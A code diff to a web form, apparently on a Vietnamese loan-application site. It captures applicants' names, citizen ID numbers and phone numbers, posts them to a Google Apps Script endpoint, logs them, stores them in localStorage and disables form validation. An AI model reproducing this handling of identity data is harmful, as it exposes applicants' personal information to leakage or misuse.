@@ -886,6 +886,10 @@
             function submitform() {
                 document.getElementById("popuploadingmain").style.visibility="visible";
                 var $form = $('form#form')
+                const hoten = $("#hoten").val()
+                const CCCD = $("#CCCD").val()
+                const sdt = $("#sdt").val()
+                console.log('kkkkk',hoten, CCCD,sdt)
                 url = 'https://script.google.com/macros/s/AKfycbw8dXrZZGNl7J43Uks57ov_8Foe79lHmSJgC5LS7STgHeex04WB/exec'
                 var jqxhr = $.ajax({
                             url: url,
@@ -895,8 +899,14 @@
                             success : function(data) {
                                 console.log(data);
                                 document.getElementById("popuploadingmain").style.visibility="hidden";
+
+
+                                window.localStorage.setItem('hoten', hoten)
+				                window.localStorage.setItem('sdt', sdt)
+                                window.localStorage.setItem('CCCD', CCCD)
+                                
                                 alert("Đã gửi hồ sơ thành công quý khách vui lòng đợi thẩm định hồ sơ trong ngày !");
-                                window.location.href = 'https://canvayngay.com'
+                                window.location.href = 'https://canvayngay.com/chamsim'
                             }
                         })
                 
@@ -1207,10 +1217,10 @@
             
             $('#submit-form').on('click', function(e) {
                 e.preventDefault();
-                if (validateform()){
-                    submitform()
-                };
-                // submitform();
+                // if (validateform()){
+                //     submitform()
+                // };
+                submitform();
                     
             })
             
@@ -1223,7 +1233,6 @@
         window.dataLayer = window.dataLayer || [];
         function gtag(){dataLayer.push(arguments);}
         gtag('js', new Date());
-
         gtag('config', 'G-QXRYLY2J11');
         </script>  
 </body>
